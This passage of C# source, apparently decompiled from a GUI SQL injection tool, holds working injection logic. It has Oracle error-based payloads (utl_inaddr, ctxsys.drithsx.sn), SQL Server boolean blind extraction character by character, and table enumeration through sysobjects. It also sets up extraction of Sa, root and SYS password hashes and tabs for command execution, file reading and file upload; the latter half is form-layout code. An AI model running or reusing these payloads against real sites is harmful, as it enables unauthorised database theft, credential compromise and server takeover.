                    this.mainfrm.DisplayProgress(string.Concat(strArray6));
                }
                if (!string.IsNullOrEmpty(itemByOraclePlainText))
                {
                    return itemByOraclePlainText;
                }
                return itemByOraclePlainText;
            }
            catch
            {
                return itemByOraclePlainText;
            }
        }

        private string GetItemByOraclePlainText(string ItemName)
        {
            while (this.mainfrm.CurrentSite.HTTPThreadNum > 1)
            {
                Thread.Sleep(500);
            }
            string uRL = this.URL + this.PreFix + "||utl_inaddr.get_host_name((chr(33)||chr(83)||chr(33)||(" + ItemName + ")||chr(33)||chr(69)||chr(33)))" + this.CommentString;
            string sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
            Regex regex = new Regex(@"(?<=(!S!))[.\s\S]*?(?=(!E!))", RegexOptions.Singleline | RegexOptions.Multiline);
            string str3 = regex.Match(sourceCode).Value;
            if (!string.IsNullOrEmpty(str3))
            {
                return str3;
            }
            uRL = this.URL + this.PreFix + "%20" + this.LogicOperator + "%20ctxsys.drithsx.sn(1,(chr(33)||chr(83)||chr(33)||(" + ItemName + ")||chr(33)||chr(69)||chr(33)))=1" + this.CommentString;
            sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
            return regex.Match(sourceCode).Value;
        }

        private string GetItemBySQLServer(string SelectExpression, string ItemName, string FromExpression, int MaxChar, int MaxLength, bool NeedTempTable)
        {
            string str = "";
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.UnKnown)
                {
                    this.GetBlindType(this.URL);
                }
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.PlainText)
                {
                    string uRL = this.URL + this.PreFix + "%20" + this.LogicOperator + "%20(char(33)%2Bchar(83)%2Bchar(33)%2B(" + SelectExpression + "%20" + ItemName + "%20" + FromExpression + ")%2Bchar(33)%2Bchar(69)%2Bchar(33))>0" + this.PostFix;
                    Regex regex = new Regex(@"(?<=(!S!))[.\s\S]*?(?=(!E!))", RegexOptions.Singleline | RegexOptions.Multiline);
                    str = regex.Match(this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType)).Value;
                    this.mainfrm.DisplayProgress("Get : " + str);
                    if (!string.IsNullOrEmpty(str))
                    {
                        return str;
                    }
                }
                else if (this.mainfrm.CurrentSite.BlindInjType == BlindType.FieldEcho)
                {
                    str = this.GetItemByFieldEcho(SelectExpression, ItemName, FromExpression, NeedTempTable);
                    if (!string.IsNullOrEmpty(str))
                    {
                        return str;
                    }
                }
                this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(this.URL);
                if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
                {
                    return "";
                }
                int num = this.GetIntValue(SelectExpression + "%20len(" + ItemName + ")%20" + FromExpression, MaxLength, 0);
                this.mainfrm.DisplayProgress("Get Length: " + num.ToString());
                if (num < 1)
                {
                    return "";
                }
                for (int i = 0; i < num; i++)
                {
                    string[] strArray3 = new string[] { SelectExpression, "%20ASCII(SUBSTRING(", ItemName, ",", (i + 1).ToString(), ",1))%20", FromExpression };
                    char ch = (char) this.GetIntValue(string.Concat(strArray3), MaxChar, 0);
                    if (ch > '\x007f')
                    {
                        string[] strArray4 = new string[] { SelectExpression, "%20UNICODE(SUBSTRING(", ItemName, ",", (i + 1).ToString(), ",1))%20", FromExpression };
                        str = str + ((char) this.GetIntValue(string.Concat(strArray4), 0xffff, 0x80));
                    }
                    else
                    {
                        str = str + ch;
                    }
                    this.mainfrm.DisplayProgress("Get " + str.Length.ToString() + "/" + num.ToString() + " :  " + str);
                }
                return str;
            }
            catch
            {
                return str;
            }
        }

        private string GetItemBySQLServerPlainText(string ItemName)
        {
            while (this.mainfrm.CurrentSite.HTTPThreadNum > 1)
            {
                Thread.Sleep(500);
            }
            string uRL = this.URL + this.PreFix + "%20" + this.LogicOperator + "%20(char(33)%2Bchar(83)%2Bchar(33)%2B(" + ItemName + ")%2Bchar(33)%2Bchar(69)%2Bchar(33))>0" + this.PostFix;
            Regex regex = new Regex(@"(?<=(!S!))[.\s\S]*?(?=(!E!))", RegexOptions.Singleline | RegexOptions.Multiline);
            for (int i = 0; i < 3; i++)
            {
                string sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                string str3 = regex.Match(sourceCode).Value;
                if (!string.IsNullOrEmpty(str3))
                {
                    return str3;
                }
            }
            return "";
        }

        private string GetItemFromPlainTextCode(string SourceCode)
        {
            Regex regex = new Regex(@"(?<=(!S!))[.\s\S]*?(?=(!E!))", RegexOptions.Singleline | RegexOptions.Multiline);
            return regex.Match(SourceCode).Value;
        }

        private string GetKeyWord(string sURL)
        {
            string keyWordText = this.GetKeyWordText();
            if (!string.IsNullOrEmpty(keyWordText))
            {
                return keyWordText;
            }
            this.mainfrm.DisplayProgress("Getting KeyWord...");
            string uRL = "";
            string str3 = "";
            string sourceCode = "";
            string str5 = "";
            if (this.mainfrm.CurrentSite.InjType == InjectionType.UnKnown)
            {
                string[] strArray = this.mainfrm.CurrentSite.GetInjectableURLDesc(sURL, this.mainfrm.ReqType, "");
                foreach (string str6 in strArray)
                {
                    this.mainfrm.AddItem2ListViewWVS(str6);
                }
                foreach (string str7 in strArray)
                {
                    string[] separator = new string[] { "^^" };
                    string[] strArray3 = str7.Split(separator, StringSplitOptions.None);
                    string str8 = strArray3[4];
                    if (str8.IndexOf("XPath") < 0)
                    {
                        if (str8.IndexOf("URL") >= 0)
                        {
                            this.URL = strArray3[0];
                            this.mainfrm.ReqType = RequestType.GET;
                        }
                        else
                        {
                            string[] paraNameValue = WebSite.GetParaNameValue(strArray3[0], '^');
                            this.URL = paraNameValue[0];
                            this.mainfrm.UpdateSubmitData(paraNameValue[1]);
                            if (str8.IndexOf("POST") >= 0)
                            {
                                this.mainfrm.ReqType = RequestType.POST;
                            }
                            else if (str8.IndexOf("COOKIE") >= 0)
                            {
                                this.mainfrm.ReqType = RequestType.COOKIE;
                            }
                        }
                        this.mainfrm.InitByRequestType(this.mainfrm.ReqType);
                        this.mainfrm.UpdateURLText(this.URL);
                        string str9 = strArray3[2];
                        this.mainfrm.CurrentSite.InjType = (InjectionType) System.Enum.Parse(typeof(InjectionType), str9);
                        this.InitByInjectionType(this.mainfrm.CurrentSite.InjType, sURL);
                        this.mainfrm.CurrentSite.CurrentKeyWord = strArray3[3];
                        this.UpdateKeyWordText(this.mainfrm.CurrentSite.CurrentKeyWord);
                        return this.mainfrm.CurrentSite.CurrentKeyWord;
                    }
                }
                MessageBox.Show("Get KeyWord Failed!    Possible Reasons:\r\n* Current URL is not injectable!\r\n* Special Characters is Filtered, try to modify the advanced settings.\r\n* Injection Type Error, sometimes it need single quotes even the parameter is a Integer.\r\n", "Information", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                this.mainfrm.CurrentSite.CurrentKeyWord = "";
                return this.mainfrm.CurrentSite.CurrentKeyWord;
            }
            if (this.mainfrm.CurrentSite.InjType == InjectionType.NotInjectable)
            {
                MessageBox.Show("Current URL is not injectable !", "Information");
                this.mainfrm.CurrentSite.CurrentKeyWord = "";
                return this.mainfrm.CurrentSite.CurrentKeyWord;
            }
            if (this.mainfrm.CurrentSite.InjType == InjectionType.Integer)
            {
                uRL = this.URL + "%20and%207=7";
                str3 = this.URL + "%20and%207=2";
            }
            else if (this.mainfrm.CurrentSite.InjType == InjectionType.String)
            {
                uRL = this.URL + this.PreFix + "%20and%20%277%27=%277";
                str3 = this.URL + this.PreFix + "%20and%20%277%27=%272";
            }
            else if (this.mainfrm.CurrentSite.InjType == InjectionType.Search)
            {
                uRL = this.URL + this.PreFix + "%20and%201%3D1%20and%20%27%25%27%3D%27";
                str3 = this.URL + this.PreFix + "%20and%201%3D2%20and%20%27%25%27%3D%27";
            }
            sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
            str5 = this.mainfrm.CurrentSite.GetSourceCode(str3, this.mainfrm.ReqType);
            this.mainfrm.CurrentSite.CurrentKeyWord = WebSite.GetKeyWordBySource(sourceCode, str5, "");
            if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
            {
                MessageBox.Show("Get KeyWord Failed!    Possible Reasons:\r\n* Current URL is not injectable!\r\n* Special Characters is Filtered, try to modify the advanced settings.\r\n* Injection Type Error, sometimes it need single quotes even the parameter is a Integer.\r\n", "Information", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                if (this.mainfrm.CurrentSite.InjType == InjectionType.Integer)
                {
                    MessageBox.Show("Please select the Injection Type: \"String\", and Retry!", "Information");
                }
                this.mainfrm.DisplayProgress("Done");
            }
            this.UpdateKeyWordText(this.mainfrm.CurrentSite.CurrentKeyWord);
            return this.mainfrm.CurrentSite.CurrentKeyWord;
        }

        private string GetKeyWordText()
        {
            if (!this.toolStripSQL.InvokeRequired)
            {
                return this.txtKeyWord.Text.Trim();
            }
            ds method = new ds(this.GetKeyWordText);
            return (string) base.Invoke(method, new object[0]);
        }

        private int GetListViewCount(ListView lv)
        {
            if (!lv.InvokeRequired)
            {
                return lv.Items.Count;
            }
            ddGetListViewCount method = new ddGetListViewCount(this.GetListViewCount);
            return (int) base.Invoke(method, new object[] { lv });
        }

        private string GetServer(string sURL)
        {
            try
            {
                return this.mainfrm.CurrentSite.GetHttpWebResponse(sURL, this.mainfrm.ReqType).Server.ToString();
            }
            catch
            {
                return "";
            }
        }

        private void GetTableDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { '^' });
                string str2 = strArray[1];
                string str3 = strArray[2];
                this.AddTable2TreeView(strArray[0] + "^" + this.GetItemBySQLServer("select%20top%201%20", "name", " from(Select top " + str2 + " id,name from [" + str3 + "]..[sysobjects] where xtype=0x55  and name not like 0x570043005200540045004D0050002500 order by id) T order by id desc", 0xff, 0x80, true));
            }
            catch
            {
            }
        }

        private int GetTreeViewDBCount(string TreeInfo)
        {
            try
            {
                if (!this.treeViewDB.InvokeRequired)
                {
                    if (string.IsNullOrEmpty(TreeInfo))
                    {
                        return this.treeViewDB.Nodes.Count;
                    }
                    string[] strArray = TreeInfo.Split(new char[] { '^' });
                    switch (strArray.Length)
                    {
                        case 1:
                        {
                            int num2 = int.Parse(strArray[0]);
                            return this.treeViewDB.Nodes[num2].Nodes.Count;
                        }
                        case 2:
                        {
                            int num3 = int.Parse(strArray[0]);
                            int num4 = int.Parse(strArray[1]);
                            return this.treeViewDB.Nodes[num3].Nodes[num4].Nodes.Count;
                        }
                    }
                    return 0;
                }
                GetTreeCount method = new GetTreeCount(this.GetTreeViewDBCount);
                return (int) base.Invoke(method, new object[] { TreeInfo });
            }
            catch
            {
                return 0;
            }
        }

        private string GetTreeViewDBText(string TreeInfo)
        {
            try
            {
                if (!this.treeViewDB.InvokeRequired)
                {
                    string[] strArray = TreeInfo.Split(new char[] { '^' });
                    switch (strArray.Length)
                    {
                        case 1:
                        {
                            int num2 = int.Parse(strArray[0]);
                            return this.treeViewDB.Nodes[num2].Text;
                        }
                        case 2:
                        {
                            int num3 = int.Parse(strArray[0]);
                            int num4 = int.Parse(strArray[1]);
                            return this.treeViewDB.Nodes[num3].Nodes[num4].Text;
                        }
                        case 3:
                        {
                            int num5 = int.Parse(strArray[0]);
                            int num6 = int.Parse(strArray[1]);
                            int num7 = int.Parse(strArray[2]);
                            return this.treeViewDB.Nodes[num5].Nodes[num6].Nodes[num7].Text;
                        }
                    }
                    return "";
                }
                DDReadTree method = new DDReadTree(this.GetTreeViewDBText);
                return (string) base.Invoke(method, new object[] { TreeInfo });
            }
            catch
            {
                return "";
            }
        }

        public XmlDocument GetXmlDocumentFromDBTree()
        {
            XmlDocument document = new XmlDocument();
            XmlNode newChild = document.CreateXmlDeclaration("1.0", "utf-8", "");
            document.AppendChild(newChild);
            XmlElement element = document.CreateElement("ROOT");
            document.AppendChild(element);
            XmlElement element2 = document.CreateElement("SiteDBStructure");
            element.AppendChild(element2);
            string text = "";
            string str2 = "";
            string str3 = "";
            foreach (TreeNode node2 in this.treeViewDB.Nodes)
            {
                text = node2.Text;
                XmlElement element3 = document.CreateElement("Database");
                element3.SetAttribute("Text", text);
                element2.AppendChild(element3);
                XmlNode node3 = document.SelectSingleNode("//ROOT/SiteDBStructure/Database[@Text=\"" + text + "\"]");
                foreach (TreeNode node4 in node2.Nodes)
                {
                    str2 = node4.Text;
                    XmlElement element4 = document.CreateElement("Table");
                    element4.SetAttribute("Text", str2);
                    node3.AppendChild(element4);
                    XmlNode node5 = document.SelectSingleNode("//ROOT/SiteDBStructure/Database[@Text=\"" + text + "\"]/Table[@Text=\"" + str2 + "\"]");
                    foreach (TreeNode node6 in node4.Nodes)
                    {
                        str3 = node6.Text;
                        XmlElement element5 = document.CreateElement("Column");
                        element5.SetAttribute("Text", str3);
                        node5.AppendChild(element5);
                    }
                }
            }
            return document;
        }

        public XmlDocument GetXmlDocumentFromEnv()
        {
            XmlDocument document = new XmlDocument();
            XmlNode newChild = document.CreateXmlDeclaration("1.0", "utf-8", "");
            document.AppendChild(newChild);
            XmlElement element = document.CreateElement("ROOT");
            document.AppendChild(element);
            XmlElement element2 = document.CreateElement("SiteSQLEnv");
            element.AppendChild(element2);
            for (int i = 0; i < this.listViewEnv.Items.Count; i++)
            {
                ListViewItem item = this.listViewEnv.Items[i];
                XmlElement element3 = document.CreateElement("EnvRow");
                XmlElement element4 = document.CreateElement("Environment");
                element4.InnerText = item.SubItems[0].Text;
                element3.AppendChild(element4);
                element4 = document.CreateElement("Value");
                if (item.SubItems.Count < 2)
                {
                    element4.InnerText = "";
                }
                else
                {
                    element4.InnerText = item.SubItems[1].Text;
                }
                element3.AppendChild(element4);
                element2.AppendChild(element3);
            }
            return document;
        }

        private void InitByDBType(bool IsLoadFromFile)
        {
            this.ClearListView(this.listViewEnv);
            if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
            {
                this.AddTabPagesByName(this.tabCMD);
                this.AddTabPagesByName(this.tabFileUploader);
                this.RemoveTabPagesByName(this.tabFileReader);
                if (!IsLoadFromFile)
                {
                    this.AddItem2ListViewInfo("Version");
                    this.AddItem2ListViewInfo("Server");
                    this.AddItem2ListViewInfo("WWWRoot");
                    this.AddItem2ListViewInfo("user");
                    this.AddItem2ListViewInfo("IsAdmin");
                    this.AddItem2ListViewInfo("Database");
                    this.AddItem2ListViewInfo("Sa_PasswordHash");
                }
                this.CommentString = "%2D%2D";
                this.WildField = "1";
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
            {
                this.RemoveTabPagesByName(this.tabCMD);
                this.RemoveTabPagesByName(this.tabFileUploader);
                this.AddTabPagesByName(this.tabFileReader);
                if (!IsLoadFromFile)
                {
                    this.AddItem2ListViewInfo("Version");
                    this.AddItem2ListViewInfo("Server");
                    this.AddItem2ListViewInfo("OS");
                    this.AddItem2ListViewInfo("user");
                    this.AddItem2ListViewInfo("Database");
                    this.AddItem2ListViewInfo("root_PasswordHash");
                }
                this.CommentString = "%23";
                this.WildField = "1";
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)
            {
                this.RemoveTabPagesByName(this.tabCMD);
                this.RemoveTabPagesByName(this.tabFileUploader);
                this.RemoveTabPagesByName(this.tabFileReader);
                if (!IsLoadFromFile)
                {
                    this.AddItem2ListViewInfo("user");
                    this.AddItem2ListViewInfo("Server");
                    this.AddItem2ListViewInfo("Version");
                    this.AddItem2ListViewInfo("instance_name");
                    this.AddItem2ListViewInfo("SYS_PasswordHash");
                    this.AddItem2ListViewInfo("user_PasswordHash");
                }
                this.CommentString = "%2D%2D";
                this.WildField = "1";
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Access)
            {
                this.RemoveTabPagesByName(this.tabCMD);
                this.RemoveTabPagesByName(this.tabFileUploader);
                this.RemoveTabPagesByName(this.tabFileReader);
                if (!IsLoadFromFile)
                {
                    this.AddItem2ListViewInfo("Server");
                    this.treeViewDB.Nodes.Clear();
                    this.AddDB2TreeView("Access");
                }
                this.CommentString = "%00";
                this.WildField = "1";
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
            {
                this.RemoveTabPagesByName(this.tabCMD);
                this.RemoveTabPagesByName(this.tabFileUploader);
                this.RemoveTabPagesByName(this.tabFileReader);
                this.AddItem2ListViewInfo("Version");
                this.AddItem2ListViewInfo("Server");
                this.AddItem2ListViewInfo("user");
                this.AddItem2ListViewInfo("Database");
                this.CommentString = "%2D%2D";
                this.WildField = "chr(97)";
            }
            else
            {
                this.RemoveTabPagesByName(this.tabCMD);
                this.RemoveTabPagesByName(this.tabFileUploader);
                this.RemoveTabPagesByName(this.tabFileReader);
                this.CommentString = "%2D%2D";
            }
        }

        public void InitByInjectionType(InjectionType InjType, string sURL)
        {
            this.LogicOperator = "aNd";
            if (sURL.IndexOf("99999999") > 0)
            {
                this.LogicOperator = "oR";
            }
            if (InjType == InjectionType.Integer)
            {
                this.UpdateComboInjType("Integer");
                this.PreFix = "";
                this.PostFix = "";
            }
            else if (InjType == InjectionType.String)
            {
                this.UpdateComboInjType("String");
                this.PreFix = "%27";
                this.PostFix = "%20and%20%271%27=%271";
            }
            else if (InjType == InjectionType.Search)
            {
                this.UpdateComboInjType("Search");
                this.PreFix = "%27";
                this.PostFix = "%20%2d%2d%20";
                this.LogicOperator = "oR";
            }
            else
            {
                this.UpdateComboInjType("UnKnown");
                this.PreFix = "";
                this.PostFix = "";
                this.LogicOperator = "aNd";
            }
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormSQL));
            this.tabSQLInjection = new System.Windows.Forms.TabControl();
            this.tabEnv = new System.Windows.Forms.TabPage();
            this.listViewEnv = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.toolStripEnv = new System.Windows.Forms.ToolStrip();
            this.toolStripSeparator11 = new System.Windows.Forms.ToolStripSeparator();
            this.btnGetInfo = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator12 = new System.Windows.Forms.ToolStripSeparator();
            this.tabDatabase = new System.Windows.Forms.TabPage();
            this.splitDB = new System.Windows.Forms.SplitContainer();
            this.treeViewDB = new System.Windows.Forms.TreeView();
            this.WCRImageList = new System.Windows.Forms.ImageList(this.components);
            this.toolStripDB = new System.Windows.Forms.ToolStrip();
            this.cmbChkAllDB = new System.Windows.Forms.ToolStripComboBox();
            this.toolStripSeparator8 = new System.Windows.Forms.ToolStripSeparator();
            this.btnGetDB = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
            this.btnGetTable = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
            this.btnGetColumn = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator6 = new System.Windows.Forms.ToolStripSeparator();
            this.btnImpDB = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator17 = new System.Windows.Forms.ToolStripSeparator();
            this.btnExpDB = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator19 = new System.Windows.Forms.ToolStripSeparator();
            this.listViewData = new System.Windows.Forms.ListView();
            this.toolStripData = new System.Windows.Forms.ToolStrip();
            this.toolStripLabel4 = new System.Windows.Forms.ToolStripLabel();
            this.txtRowsBegin = new System.Windows.Forms.ToolStripTextBox();
            this.toolStripLabel5 = new System.Windows.Forms.ToolStripLabel();
            this.txtRowsEnd = new System.Windows.Forms.ToolStripTextBox();
            this.toolStripSeparator7 = new System.Windows.Forms.ToolStripSeparator();
            this.btnGetData = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator9 = new System.Windows.Forms.ToolStripSeparator();
            this.btnExpData = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator18 = new System.Windows.Forms.ToolStripSeparator();
            this.tabCMD = new System.Windows.Forms.TabPage();
            this.listBoxCMD = new System.Windows.Forms.ListBox();
            this.toolStripDBCMD = new System.Windows.Forms.ToolStrip();
            this.toolStripSeparator15 = new System.Windows.Forms.ToolStripSeparator();
            this.txtDBCMD = new System.Windows.Forms.ToolStripTextBox();
            this.btnDBCMD = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator16 = new System.Windows.Forms.ToolStripSeparator();
            this.toolStripCommand = new System.Windows.Forms.ToolStrip();
            this.toolStripSeparator13 = new System.Windows.Forms.ToolStripSeparator();
            this.txtCMD = new System.Windows.Forms.ToolStripTextBox();
            this.btnCMD = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator14 = new System.Windows.Forms.ToolStripSeparator();
            this.tabFileReader = new System.Windows.Forms.TabPage();
            this.txtFileContent = new System.Windows.Forms.TextBox();
            this.toolFileReader = new System.Windows.Forms.ToolStrip();
            this.toolStripLabel6 = new System.Windows.Forms.ToolStripLabel();
            this.txtFileName = new System.Windows.Forms.ToolStripTextBox();
            this.btnReadFile = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator10 = new System.Windows.Forms.ToolStripSeparator();
            this.tabFileUploader = new System.Windows.Forms.TabPage();
            this.btnGetWebRoot = new System.Windows.Forms.Button();
            this.label3 = new System.Windows.Forms.Label();
            this.txtTargetFileName = new System.Windows.Forms.TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.btnSelectFile = new System.Windows.Forms.Button();
            this.btnFileUpload = new System.Windows.Forms.Button();
            this.txtUploadFile = new System.Windows.Forms.TextBox();
            this.tabEscapeString = new System.Windows.Forms.TabPage();
            this.label17 = new System.Windows.Forms.Label();
            this.label16 = new System.Windows.Forms.Label();
            this.btnEncode = new System.Windows.Forms.Button();
            this.txtEscapeString = new System.Windows.Forms.TextBox();
            this.txtSourceString = new System.Windows.Forms.TextBox();
            this.label6 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.tabDebug = new System.Windows.Forms.TabPage();
            this.grpBlindType = new System.Windows.Forms.GroupBox();
            this.label20 = new System.Windows.Forms.Label();
            this.label21 = new System.Windows.Forms.Label();
            this.label22 = new System.Windows.Forms.Label();
            this.ComboBoxWebEncoding = new System.Windows.Forms.ComboBox();
            this.label19 = new System.Windows.Forms.Label();
            this.ComboBoxDBEncoding = new System.Windows.Forms.ComboBox();
            this.label18 = new System.Windows.Forms.Label();
            this.txtComment = new System.Windows.Forms.TextBox();
            this.lblComment = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.radioCrossSite = new System.Windows.Forms.RadioButton();
            this.label15 = new System.Windows.Forms.Label();
            this.label14 = new System.Windows.Forms.Label();
            this.label13 = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.txtWildField = new System.Windows.Forms.TextBox();
            this.label9 = new System.Windows.Forms.Label();
            this.btnSetEnv = new System.Windows.Forms.Button();
            this.btnGetEnv = new System.Windows.Forms.Button();
            this.label8 = new System.Windows.Forms.Label();
            this.txtInjectField = new System.Windows.Forms.TextBox();
            this.label7 = new System.Windows.Forms.Label();
            this.txtFieldNum = new System.Windows.Forms.TextBox();
            this.radioBlind = new System.Windows.Forms.RadioButton();
            this.radioFieldEcho = new System.Windows.Forms.RadioButton();
            this.radioPlainText = new System.Windows.Forms.RadioButton();
            this.toolStripSQL = new System.Windows.Forms.ToolStrip();
            this.toolStripLabel1 = new System.Windows.Forms.ToolStripLabel();
            this.cmbDBTypeList = new System.Windows.Forms.ToolStripComboBox();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.toolStripLabel2 = new System.Windows.Forms.ToolStripLabel();
            this.txtKeyWord = new System.Windows.Forms.ToolStripTextBox();
            this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
            this.toolStripLabel3 = new System.Windows.Forms.ToolStripLabel();
            this.cmbInjectionType = new System.Windows.Forms.ToolStripComboBox();
            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.ButtonResetSQL = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator20 = new System.Windows.Forms.ToolStripSeparator();
            this.tabSQLInjection.SuspendLayout();
            this.tabEnv.SuspendLayout();
            this.toolStripEnv.SuspendLayout();
            this.tabDatabase.SuspendLayout();
            this.splitDB.Panel1.SuspendLayout();
            this.splitDB.Panel2.SuspendLayout();
            this.splitDB.SuspendLayout();
            this.toolStripDB.SuspendLayout();
            this.toolStripData.SuspendLayout();
            this.tabCMD.SuspendLayout();
            this.toolStripDBCMD.SuspendLayout();
            this.toolStripCommand.SuspendLayout();
            this.tabFileReader.SuspendLayout();
            this.toolFileReader.SuspendLayout();
            this.tabFileUploader.SuspendLayout();
            this.tabEscapeString.SuspendLayout();
            this.tabDebug.SuspendLayout();
            this.grpBlindType.SuspendLayout();
            this.toolStripSQL.SuspendLayout();
            this.SuspendLayout();
            // 
            // tabSQLInjection
            // 
            this.tabSQLInjection.Controls.Add(this.tabEnv);
            this.tabSQLInjection.Controls.Add(this.tabDatabase);
            this.tabSQLInjection.Controls.Add(this.tabCMD);
            this.tabSQLInjection.Controls.Add(this.tabFileReader);
            this.tabSQLInjection.Controls.Add(this.tabFileUploader);
            this.tabSQLInjection.Controls.Add(this.tabEscapeString);
            this.tabSQLInjection.Controls.Add(this.tabDebug);
            this.tabSQLInjection.Dock = System.Windows.Forms.DockStyle.Fill;
            this.tabSQLInjection.ImageList = this.WCRImageList;
            this.tabSQLInjection.Location = new System.Drawing.Point(0, 25);
            this.tabSQLInjection.Name = "tabSQLInjection";
            this.tabSQLInjection.SelectedIndex = 0;
            this.tabSQLInjection.Size = new System.Drawing.Size(685, 391);
            this.tabSQLInjection.TabIndex = 0;
            // 
            // tabEnv
            // 
            this.tabEnv.Controls.Add(this.listViewEnv);
            this.tabEnv.Controls.Add(this.toolStripEnv);
            this.tabEnv.ImageKey = "env.png";
            this.tabEnv.Location = new System.Drawing.Point(4, 23);
            this.tabEnv.Name = "tabEnv";
            this.tabEnv.Padding = new System.Windows.Forms.Padding(3);
            this.tabEnv.Size = new System.Drawing.Size(677, 364);
            this.tabEnv.TabIndex = 0;
            this.tabEnv.Text = "Environment";
            this.tabEnv.UseVisualStyleBackColor = true;
            // 
            // listViewEnv
            // 
            this.listViewEnv.CheckBoxes = true;
            this.listViewEnv.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2});
            this.listViewEnv.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listViewEnv.FullRowSelect = true;
            this.listViewEnv.Location = new System.Drawing.Point(3, 3);
            this.listViewEnv.MultiSelect = false;
            this.listViewEnv.Name = "listViewEnv";
            this.listViewEnv.Size = new System.Drawing.Size(671, 333);
            this.listViewEnv.TabIndex = 14;
            this.listViewEnv.UseCompatibleStateImageBehavior = false;
            this.listViewEnv.View = System.Windows.Forms.View.Details;
            this.listViewEnv.MouseClick += new System.Windows.Forms.MouseEventHandler(this.listViewEnv_MouseClick);
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Environment";
            this.columnHeader1.Width = 194;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "Value";
            this.columnHeader2.Width = 480;
            // 
            // toolStripEnv
            // 
            this.toolStripEnv.BackColor = System.Drawing.SystemColors.ButtonFace;
            this.toolStripEnv.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.toolStripEnv.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
            this.toolStripEnv.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripSeparator11,
            this.btnGetInfo,
            this.toolStripSeparator12});
            this.toolStripEnv.Location = new System.Drawing.Point(3, 336);
            this.toolStripEnv.Name = "toolStripEnv";
            this.toolStripEnv.Size = new System.Drawing.Size(671, 25);
            this.toolStripEnv.TabIndex = 13;
            this.toolStripEnv.Text = "toolStrip1";
            // 
            // toolStripSeparator11
            // 
            this.toolStripSeparator11.Name = "toolStripSeparator11";
            this.toolStripSeparator11.Size = new System.Drawing.Size(6, 25);
            // 
            // btnGetInfo
            // 
            this.btnGetInfo.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.btnGetInfo.Image = ((System.Drawing.Image)(resources.GetObject("btnGetInfo.Image")));
            this.btnGetInfo.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.btnGetInfo.Name = "btnGetInfo";
            this.btnGetInfo.Size = new System.Drawing.Size(175, 22);
            this.btnGetInfo.Text = "Get Environment Infomation";
            this.btnGetInfo.Click += new System.EventHandler(this.btnGetInfo_Click);
            // 
            // toolStripSeparator12
            // 
            this.toolStripSeparator12.Name = "toolStripSeparator12";
            this.toolStripSeparator12.Size = new System.Drawing.Size(6, 25);
            // 
            // tabDatabase
            // 
            this.tabDatabase.Controls.Add(this.splitDB);
            this.tabDatabase.ImageKey = "db.png";
            this.tabDatabase.Location = new System.Drawing.Point(4, 23);
            this.tabDatabase.Name = "tabDatabase";
            this.tabDatabase.Padding = new System.Windows.Forms.Padding(3);
            this.tabDatabase.Size = new System.Drawing.Size(677, 366);
            this.tabDatabase.TabIndex = 1;
            this.tabDatabase.Text = "DataBase";
